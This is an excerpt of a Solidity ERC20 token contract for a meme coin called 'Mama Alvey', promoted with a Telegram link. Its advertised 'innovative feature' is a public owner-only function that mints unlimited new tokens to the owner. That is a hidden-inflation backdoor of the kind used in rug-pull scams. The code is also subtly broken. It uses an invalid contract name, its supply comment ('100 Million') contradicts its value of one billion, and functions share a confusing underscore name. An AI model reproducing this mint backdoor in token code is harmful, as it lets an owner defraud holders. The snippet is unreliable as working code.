...
//
// $MamaAlvey proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MamaAlvey
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MamaAlvey(uint256 amount) public onlyOwner {
 _MamaAlvey(msg.sender, amount);
    }
    ...
    function _MamaAlvey(address account, uint256 amount) internal virtual {
...
contract $MamaAlvey is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Mama Alvey", " MALVEY ") {
     _MamaAlvey(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}